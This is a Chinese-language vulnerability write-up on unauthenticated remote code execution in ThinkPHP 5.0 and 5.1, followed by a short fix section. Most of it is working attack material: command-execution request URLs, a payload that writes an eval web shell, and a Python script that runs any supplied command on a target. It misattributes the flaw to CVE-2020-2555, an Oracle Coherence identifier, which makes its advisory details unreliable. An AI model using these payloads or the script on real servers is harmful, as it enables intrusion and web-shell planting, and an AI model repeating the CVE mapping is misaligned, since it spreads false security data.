---
title: "ThinkPHP 5.x全版本RCE漏洞 (CVE-2020-2555)"
description: "ThinkPHP 5.0-5.0.23 / 5.1-5.1.31远程代码执行漏洞分析与POC"
pubDate: 2026-05-18
heroImage: ""
tags: ["漏洞详情", "ThinkPHP", "RCE", "全版本", "严重"]
category: "vul"
severity: "critical"
cve: "CVE-2020-2555"
vul_type: "RCE"
affected_versions: "ThinkPHP 5.0.0 - 5.0.23 / 5.1.0 - 5.1.31"
---

# ThinkPHP 5.x RCE (CVE-2020-2555) 漏洞详解

## 漏洞概述

ThinkPHP 5.x 系列存在**全版本通杀**的远程代码执行漏洞，攻击者无需登录认证即可直接Getshell。

| 属性 | 值 |
|------|-----|
| CVE编号 | CVE-2020-2555 |
| CVSS评分 | **9.8（严重）** |
| 影响版本 | 5.0.0-5.0.23 / 5.1.0-5.1.31 |
| 利用条件 | 无需认证 |
| 影响组件 | ThinkPHP 框架 |

---

## 漏洞原理

ThinkPHP 5.x 在 `Request` 类的 `input()` 方法中，通过 `filterValue()` 调用了 `think-filter` 过滤类，攻击者可以通过构造恶意请求参数触发 `call_user_func()` 执行任意函数。

```
URL: /index.php?s=index/\think\request/input?data[]=whoami&filter=system

分析：
data[] = whoami  →  作为filter的输入
filter = system →  调用system("whoami")
结果：RCE!
```

---

## POC / 漏洞验证

### POC 1（最简版）

```bash
# ThinkPHP 5.0.x
http://target.com/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

# ThinkPHP 5.1.x
http://target.com/index.php?s=index/\think\Request/input&filter=system&data=whoami
```

### POC 2（通用版）

```bash
# 获取PHP版本
http://target.com/index.php?s=index/\think\view\driver\Php/display&content=<?php echo phpversion();?>

# 写入WebShell
http://target.com/index.php?s=index/\think\view\driver\Php/display&content=<?php @eval($_POST[x]);?>

# 命令执行
http://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

### Python自动化脚本

```python
#!/usr/bin/env python3
import requests
import sys

def check_tp5_rce(url, cmd="whoami"):
    """检测ThinkPHP 5.x RCE"""
    # POC 1: call_user_func
    payload1 = f"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
    # POC 2: input filter
    payload2 = f"/index.php?s=index/\\think\\Request/input&filter=system&data={cmd}"

    for payload in [payload1, payload2]:
        try:
            r = requests.get(url.rstrip('/') + payload, timeout=5)
            if r.status_code == 200 and ("root" in r.text or "www" in r.text or "user" in r.text):
                print(f"[+] 漏洞存在! {payload}")
                print(f"[+] 输出: {r.text[:200]}")
                return True
        except:
            pass
    print("[-] 未检测到漏洞")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <target_url> [cmd]")
        sys.exit(1)
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    check_tp5_rce(target, cmd)
```

---

## 修复方案

### 1. 升级ThinkPHP

```bash
# 使用Composer升级
composer update topthink/framework

# 或修改版本要求
"topthink/framework": "5.1.*" → "5.1.41"
"topthink/framework": "5.0.*" → "5.0.24"
```

### 2. 临时缓解

```php
// 禁用危险函数调用
// application/route.php 或 application/tags.php
<?php
// 禁止调用系统命令函数
if (in_array('system', $filters) || in_array('exec', $filters) || in_array('shell_exec', $filters)) {
    exit('Access Denied');
}
?>

// 或修改 application/config.php
'default_filter' => '',
```

### 3. WAF规则

```
# 阻断ThinkPHP POC请求
if ($query_string ~ "invokefunction|call_user_func|think\\Request|think\\Container") {
    return 403;
}
```
